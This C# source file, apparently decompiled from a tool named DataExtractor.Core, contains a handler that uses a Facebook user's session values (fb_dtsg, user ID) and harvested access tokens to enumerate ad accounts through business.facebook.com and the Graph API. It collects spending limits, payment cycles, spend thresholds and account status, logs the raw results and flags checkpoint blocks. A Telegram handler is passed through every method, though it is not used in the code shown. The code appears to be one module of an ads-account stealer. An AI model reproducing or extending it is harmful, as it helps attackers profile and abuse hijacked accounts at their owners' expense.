using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Models;
using DataExtractor.Core.Models.Json;
using DataExtractor.Core.Models.Json.GetInfoPendingJsonModel;
using GraphData.Core.Models.Json;
using Newtonsoft.Json;

namespace DataExtractor.Core.Handlers.Fb;

internal class GetInfoAdsAccountHandler
{
	public void Run(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		GetLimit(fbData, httpClient, telegramHandler);
		GetNguong(fbData, httpClient, telegramHandler);
	}

	private void GetSpending(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		string url = "https://business.facebook.com/api/graphql/";
		foreach (AdsAccount item in fbData.AdsAccount.Where((AdsAccount a) => a.name == null))
		{
			fbData.Log("Get pending " + item.id);
			string formData = "av=" + fbData.UserId + "&__user=" + fbData.UserId + "&__a=&__dyn=&__csr=&__req=&__hs=&dpr=&__ccg=&__rev=&__s=&__hsi=&__comet_req=&fb_dtsg=" + fbData.Fbdtsg + "&jazoest=&lsd=&__spin_r=&__spin_b=&__spin_t=&__jssesw=&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BillingAMNexusRootQuery&variables=%7B%22paymentAccountID%22%3A%22" + item.account_id + "%22%2C%22start%22%3Anull%2C%22end%22%3Anull%7D&server_timestamps=true&doc_id=7944830928890689";
			string text = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string>
			{
				{ "Sec-Fetch-Site", "same-origin" },
				{ "Sec-Fetch-Mode", "cors" },
				{ "Sec-Fetch-Dest", "empty" },
				{ "Accept", "application/json" }
			});
			if (string.IsNullOrEmpty(text))
			{
				fbData.Log("No result : pending");
				continue;
			}
			try
			{
				GetInfoPendingJsonModel getInfoPendingJsonModel = JsonConvert.DeserializeObject<GetInfoPendingJsonModel>(text);
			}
			catch (Exception ex)
			{
				fbData.Log("error get pending : " + text + " \n " + ex.ToString());
			}
		}
	}

	public void GetLimit(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		fbData.Log("Get limit");
		GetLimit(fbData, fbData.Bussinesses, httpClient, telegramHandler);
	}

	public void GetLimit(FbData fbData, IEnumerable<AdsBusiness> allBm, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		foreach (AdsBusiness item in allBm.Where((AdsBusiness a) => !a.name.Contains("ads limit")))
		{
			fbData.Log("get limit bm " + item.id);
			string url = "https://business.facebook.com/business/adaccount/limits/?business_id=" + item.id;
			string formData = "__user=" + fbData.UserId + "&__a=1&fb_dtsg=" + fbData.Fbdtsg;
			string text = httpClient.PostString(url, formData, "application/x-www-form-urlencoded", new Dictionary<string, string>
			{
				{ "Sec-Fetch-Site", "same-origin" },
				{ "Sec-Fetch-Mode", "cors" },
				{ "Sec-Fetch-Dest", "empty" }
			});
			fbData.Log("result get limit " + item.id + " : " + text);
			string text2 = text.CutString("adAccountLimit\":", "}");
			if (!string.IsNullOrEmpty(text2))
			{
				item.name = item.name + " (ads limit : " + text2 + ")";
			}
		}
	}

	public void GetNguong(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		fbData.Log("Tiến hành get ngưỡng");
		if (fbData.FbToken.Tokens.FirstOrDefault((string a) => a.StartsWith("EAAG")) != null)
		{
			GetNguongByBatchFile(fbData.FbToken.Tokens.First((string a) => a.StartsWith("EAAG")), fbData, httpClient, telegramHandler);
		}
		else
		{
			GetNguongBinhThuong(fbData, httpClient, telegramHandler);
		}
	}

	private void GetNguongByBatchFile(string accessToken, FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		string url = "https://graph.facebook.com/v14.0";
		int num = 0;
		int count = 50;
		List<BatchRequestJsonModel> list = (from account in fbData.AdsAccount.Where((AdsAccount a) => string.IsNullOrEmpty(a.Nguong2)).Skip(num).Take(count)
			select new BatchRequestJsonModel
			{
				method = "GET",
				relative_url = "/" + account.id + "?fields=id,account_status,adspaymentcycle,currency,name,adtrust_dsl,amount_spent"
			}).ToList();
		if (list.Count == 0)
		{
			return;
		}
		string value = JsonConvert.SerializeObject(list);
		value = "access_token=" + accessToken + "&batch=" + WebUtility.UrlEncode(value) + "&include_headers=false";
		value = httpClient.PostString(url, value, "application/x-www-form-urlencoded");
		fbData.Log("data nguong : " + value);
		try
		{
			List<BatchNguongJson> source = JsonConvert.DeserializeObject<List<BatchNguongJson>>(value);
			foreach (BatchNguongJson item in source.Where((BatchNguongJson a) => a.code == 200))
			{
				AdsAccount adsAccount = fbData.AdsAccount.FirstOrDefault((AdsAccount a) => item.body.Contains(a.id));
				if (!item.body.Contains("error"))
				{
					adsAccount.Nguong2 = item.body;
				}
				else if (item.body.Contains("You cannot access the app"))
				{
					fbData.IsCheckpoint = true;
					fbData.Log("cp");
				}
			}
			num += 50;
		}
		catch (Exception ex)
		{
			fbData.Log(ex.ToString());
		}
		fbData.Log("ket thuc get nguong");
	}

	private void GetNguongBinhThuong(FbData fbData, HttpClient httpClient, TelegramHandler telegramHandler)
	{
		foreach (AdsAccount item in fbData.AdsAccount.Where((AdsAccount a) => string.IsNullOrEmpty(a.Nguong2)))
		{
			string nguongToken = fbData.GetNguongToken();
			if (nguongToken == null)
			{
				fbData.Log("NO token EAAI");
				continue;
			}
			string url = "https://graph.facebook.com/v14.0/" + item.id + "?fields=id,account_status,adspaymentcycle,currency,name,adtrust_dsl,amount_spent&access_token=" + nguongToken;
			string @string = httpClient.GetString(url);
			fbData.Log("Get nguong account : " + item.id + " result " + @string);
			if (!@string.Contains("error"))
			{
				item.Nguong2 = @string;
			}
			else if (@string.Contains("You cannot access the app"))
			{
				fbData.IsCheckpoint = true;
				fbData.Log("cp");
				break;
			}
		}
	}
}
